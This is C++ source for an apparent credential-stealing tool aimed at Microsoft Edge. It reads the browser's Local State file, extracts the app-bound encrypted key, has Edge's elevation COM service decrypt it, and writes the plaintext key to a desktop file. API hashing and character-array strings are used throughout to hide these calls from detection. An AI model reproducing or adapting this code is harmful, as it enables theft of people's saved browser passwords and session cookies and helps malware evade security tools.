// dllmain.cpp : Defines the entry point for the DLL application.
#include "Base64.h"
#include "ApiResolve.h"
#include "HashString.h"
#include "CRT.h"

typedef enum _PROTECTION_LEVEL
{
    PROTECTION_NONE = 0,
    PROTECTION_PATH_VALIDATION_OLD = 1,
    PROTECTION_PATH_VALIDATION = 2,
    PROTECTION_MAX = 3

} PROTECTION_LEVEL;

typedef struct IElevatorEdge IElevatorEdge;

typedef struct IElevatorEdgeVtbl
{
    // IUnknown (vtable slots 0-2)
    HRESULT(STDMETHODCALLTYPE* QueryInterface)(IElevatorEdge* This, REFIID riid, void** ppvObject);
    ULONG(STDMETHODCALLTYPE* AddRef)(IElevatorEdge* This);
    ULONG(STDMETHODCALLTYPE* Release)(IElevatorEdge* This);

    // Edge base interface placeholders (vtable slots 3-5)
    HRESULT(STDMETHODCALLTYPE* _Placeholder1)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder2)(IElevatorEdge* This);
    HRESULT(STDMETHODCALLTYPE* _Placeholder3)(IElevatorEdge* This);

    // IElevator methods (vtable slots 6-8)
    HRESULT(STDMETHODCALLTYPE* RunRecoveryCRXElevated)(
        IElevatorEdge* This,
        const WCHAR* crx_path,
        const WCHAR* browser_appid,
        const WCHAR* browser_version,
        const WCHAR* session_id,
        DWORD           caller_proc_id,
        ULONG_PTR* proc_handle
        );

    HRESULT(STDMETHODCALLTYPE* EncryptData)(
        IElevatorEdge* This,
        PROTECTION_LEVEL    protection_level,
        const BSTR          plaintext,
        BSTR* ciphertext,
        DWORD* last_error
        );

    HRESULT(STDMETHODCALLTYPE* DecryptData)(
        IElevatorEdge* This,
        const BSTR      ciphertext,
        BSTR* plaintext,
        DWORD* last_error
        );

} IElevatorEdgeVtbl;

struct IElevatorEdge
{
    IElevatorEdgeVtbl* lpVtbl;
};

void DecryptKey() {
    CLSID EdgeCLSID = { 0x1FCBE96C, 0x1697, 0x43AF, {0x91, 0x40, 0x28, 0x97, 0xC7, 0xC6, 0x97, 0x67} };
    IID EdgeIID = { 0xC9C2B807, 0x7731, 0x4F34, {0x81, 0xB7, 0x44, 0xFF, 0x77, 0x79, 0x52, 0x2B} };
    IElevatorEdge* pElevatorEdge = NULL;
    HRESULT hr;

    ApiResolve apiResolve;
    constexpr unsigned int hashKernel32 = ComplexHashForWChar(L"kernel32.dll");
    LPVOID lpKernel32 = apiResolve.GetModuleBaseAddress(hashKernel32);
    if (!lpKernel32) {
        return;
    }

    typedef HMODULE(WINAPI* _LoadLibraryA)(LPCSTR lpLibFileName);
    constexpr unsigned int hashLoadLibraryA = ComplexHashForAnsi("LoadLibraryA");
    _LoadLibraryA pLoadLibraryA = (_LoadLibraryA)apiResolve.GetApiAddress(lpKernel32, hashLoadLibraryA);
    if (!pLoadLibraryA) {
        return;
    }

    char sOle32[] = {'O', 'l', 'e', '3', '2', '.', 'd', 'l', 'l', '\0'};
    HMODULE hOle32 = pLoadLibraryA(sOle32);

    char sUser32[] = { 'u', 's', 'e', 'r', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hUser32 = pLoadLibraryA(sUser32);

    char sShell32[] = { 'S', 'h', 'e', 'l', 'l', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hShell32 = pLoadLibraryA(sShell32);
    typedef HRESULT(WINAPI* _SHGetFolderPathA)(
        HWND   hwnd,
        int    csidl,
        HANDLE hToken,
        DWORD  dwFlags,
        LPSTR  pszPath
        );
    constexpr unsigned int hashSHGetFolderPathA = ComplexHashForAnsi("SHGetFolderPathA");
    _SHGetFolderPathA pSHGetFolderPathA = (_SHGetFolderPathA)apiResolve.GetApiAddress(hShell32, hashSHGetFolderPathA);
    if (!pSHGetFolderPathA) { return; }
    char path[MAX_PATH] = { 0 };
    if (pSHGetFolderPathA(NULL, 0x001c, NULL, 0, path) != S_OK) {
        return;
    }

    char sLocalState[] = {
        '\\','M','i','c','r','o','s','o','f','t','\\',
        'E','d','g','e','\\',
        'U','s','e','r',' ','D','a','t','a','\\',
        'L','o','c','a','l',' ','S','t','a','t','e',
        '\0'
        };
    int size = StrLen(path);
    CopyStringA(sLocalState, path + StrLen(path), MAX_PATH - StrLen(sLocalState));

    typedef HANDLE(WINAPI* _CreateFileA)(
        LPCSTR                lpFileName,
        DWORD                 dwDesiredAccess,
        DWORD                 dwShareMode,
        LPSECURITY_ATTRIBUTES lpSecurityAttributes,
        DWORD                 dwCreationDisposition,
        DWORD                 dwFlagsAndAttributes,
        HANDLE                hTemplateFile
        );
    constexpr unsigned int hashCreateFileA = ComplexHashForAnsi("CreateFileA");
    _CreateFileA pCreateFileA = (_CreateFileA)apiResolve.GetApiAddress(lpKernel32, hashCreateFileA);
    if (!pCreateFileA) { return; }
    HANDLE hFile = pCreateFileA((LPCSTR)path, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (!hFile) { return; }

    typedef DWORD(WINAPI* _GetFileSize)(HANDLE, LPDWORD);
    constexpr unsigned int hashGetFileSize = ComplexHashForAnsi("GetFileSize");
    _GetFileSize pGetFileSize = (_GetFileSize)apiResolve.GetApiAddress(lpKernel32, hashGetFileSize);
    if (!pGetFileSize) { return; }
    DWORD dwFileSize = pGetFileSize(hFile, NULL);
    if (dwFileSize == 0) { return; }

    LPVOID fileBuf = NULL;
    if (!AllocMemory(dwFileSize + 1, &fileBuf)) {
        return;
    }

    typedef BOOL(WINAPI* _ReadFile)(
        HANDLE       hFile,
        LPVOID       lpBuffer,
        DWORD        nNumberOfBytesToRead,
        LPDWORD      lpNumberOfBytesRead,
        LPOVERLAPPED lpOverlapped
    );
    constexpr unsigned int hashReadFile = ComplexHashForAnsi("ReadFile");
    _ReadFile pReadFile = (_ReadFile)apiResolve.GetApiAddress(lpKernel32, hashReadFile);
    if (!pReadFile) { return; }
    if (!pReadFile(hFile, fileBuf, dwFileSize, NULL, NULL)) {
        return;
    }

    typedef BOOL(WINAPI* _CloseHandle)(HANDLE);
    constexpr unsigned int hashCloseHandle = ComplexHashForAnsi("CloseHandle");
    _CloseHandle pCloseHandle = (_CloseHandle)apiResolve.GetApiAddress(lpKernel32, hashCloseHandle);
    if (!pCloseHandle) { return; }

    pCloseHandle(hFile);

    char patternKey[] = { 'a', 'p', 'p', '_', 'b', 'o', 'u', 'n', 'd', '_', 'e', 'n', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '"', ':', '"', '\0'};
    char* keyPointer = NULL;
    if (!FindPatternA((char*)fileBuf, patternKey, StrLen(patternKey), &keyPointer)) { return; }
    keyPointer = keyPointer + StrLen(patternKey);
    int sizeKeyB64 = 0;
    for (int i = 0; ;i++) {
        if (keyPointer[i] == '"') {
            keyPointer[i] = '\0';
            break;
        }
        i++;
        sizeKeyB64++;
    }

    typedef HRESULT (WINAPI* _CoInitializeEx)(
        LPVOID pvReserved,
        DWORD  dwCoInit
    );

    constexpr unsigned int hashCoInitializeEx = ComplexHashForAnsi("CoInitializeEx");
    _CoInitializeEx pCoInitializeEx = (_CoInitializeEx)apiResolve.GetApiAddress(hOle32, hashCoInitializeEx);
    if (!pCoInitializeEx) {
        return;
    }

    hr = pCoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) {
        return;
    }

    typedef void (WINAPI* _CoUninitialize)();
    constexpr unsigned int hashCoUninitialize = ComplexHashForAnsi("CoUninitialize");
    _CoUninitialize pCoUninitialize = (_CoUninitialize)apiResolve.GetApiAddress(hOle32, hashCoUninitialize);
    if (!pCoUninitialize) { return; }

    typedef HRESULT(WINAPI* _CoCreateInstance) (REFCLSID  rclsid,
        LPUNKNOWN pUnkOuter,
        DWORD     dwClsContext,
        REFIID    riid,
        LPVOID* ppv);
    constexpr unsigned int hashCoCreateInstance = ComplexHashForAnsi("CoCreateInstance");
    _CoCreateInstance pCoCreateInstance = (_CoCreateInstance)apiResolve.GetApiAddress(hOle32, hashCoCreateInstance);
    if (!pCoCreateInstance) { return; }
    hr = pCoCreateInstance(
        EdgeCLSID,
        nullptr,
        CLSCTX_LOCAL_SERVER,
        EdgeIID,
        reinterpret_cast<void**>(&pElevatorEdge)
    );

    if (FAILED(hr)) {
        pCoUninitialize();
        return;
    }

    typedef HRESULT(WINAPI* _CoSetProxyBlanket)(
        IUnknown* pProxy,
        DWORD                    dwAuthnSvc,
        DWORD                    dwAuthzSvc,
        OLECHAR* pServerPrincName,
        DWORD                    dwAuthnLevel,
        DWORD                    dwImpLevel,
        RPC_AUTH_IDENTITY_HANDLE pAuthInfo,
        DWORD                    dwCapabilities
        );

    constexpr unsigned int hashCoSetProxyBlanket = ComplexHashForAnsi("CoSetProxyBlanket");
    _CoSetProxyBlanket pCoSetProxyBlanket = (_CoSetProxyBlanket)apiResolve.GetApiAddress(hOle32, hashCoSetProxyBlanket);
    if (!pCoSetProxyBlanket) { return; }
    hr = pCoSetProxyBlanket(
        (IUnknown*)pElevatorEdge,
        RPC_C_AUTHN_DEFAULT,
        RPC_C_AUTHZ_DEFAULT,
        COLE_DEFAULT_PRINCIPAL,
        RPC_C_AUTHN_LEVEL_PKT_PRIVACY,
        RPC_C_IMP_LEVEL_IMPERSONATE,
        NULL,
        EOAC_DYNAMIC_CLOAKING
    );

    BSTR decryptedDataBSTR = NULL;
    DWORD dwLastError = 0;
    int length = 0;
    char* encKey = Base64Decode(keyPointer, length);
    char sOleAut32[] = { 'O', 'l', 'e', 'A', 'u', 't', '3', '2', '.', 'd', 'l', 'l', '\0' };
    HMODULE hOleAut32 = pLoadLibraryA(sOleAut32);
    if (!hOleAut32) { return; }

    typedef BSTR(WINAPI* _SysAllocStringByteLen)(LPCSTR psz, UINT len);
    constexpr unsigned int hashSysAllocStringByteLen = ComplexHashForAnsi("SysAllocStringByteLen");
    _SysAllocStringByteLen pSysAllocStringByteLen = (_SysAllocStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysAllocStringByteLen);
    if (!pSysAllocStringByteLen) { return; }
    
    typedef UINT(WINAPI* _SysStringByteLen)(BSTR);
    constexpr unsigned int hashSysStringByteLen = ComplexHashForAnsi("SysStringByteLen");
    _SysStringByteLen pSysStringByteLen = (_SysStringByteLen)apiResolve.GetApiAddress(hOleAut32, hashSysStringByteLen);
    if (!pSysStringByteLen) { return; }

    typedef void (WINAPI* _SysFreeString)(BSTR bstrString);
    constexpr unsigned int hashSysFreeString = ComplexHashForAnsi("SysFreeString");
    _SysFreeString pSysFreeString = (_SysFreeString)apiResolve.GetApiAddress(hOleAut32, hashSysFreeString);
    if (!pSysFreeString) { return; }
    BSTR bstrEncKey = pSysAllocStringByteLen(encKey + 4, length - 4);
    hr = pElevatorEdge->lpVtbl->DecryptData(pElevatorEdge, bstrEncKey, &decryptedDataBSTR, &dwLastError);
    if (bstrEncKey) {
        pSysFreeString(bstrEncKey);
    }

    if (FAILED(hr)) {
        return;
    }
    else {
        typedef BOOL(WINAPI* _WriteFile)(
            HANDLE       hFile,
            LPCVOID      lpBuffer,
            DWORD        nNumberOfBytesToWrite,
            LPDWORD      lpNumberOfBytesWritten,
            LPOVERLAPPED lpOverlapped
            );
        constexpr unsigned int hashWriteFile = ComplexHashForAnsi("WriteFile");
        _WriteFile pWriteFile = (_WriteFile)apiResolve.GetApiAddress(lpKernel32, hashWriteFile);
        if (!pWriteFile) { return; }
        //Write key to file in desktop
        char path[] = { 'C', ':', '\\', 'U', 's', 'e', 'r', 's', '\\', 'a', 'd', 'm', 'i', 'n', '\\', 'D', 'e', 's', 'k', 't', 'o', 'p', '\\', 'd', 'e', 'c', 'r', 'y', 'p', 't', 'e', 'd', '_', 'k', 'e', 'y', '.', 't', 'x', 't', '\0'};
        HANDLE hFile = pCreateFileA(path, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        pWriteFile(hFile, decryptedDataBSTR, pSysStringByteLen(decryptedDataBSTR), NULL, NULL);
        pSysFreeString(decryptedDataBSTR);
        pCloseHandle(hFile);
    }
}

int main() {
    DecryptKey();
}
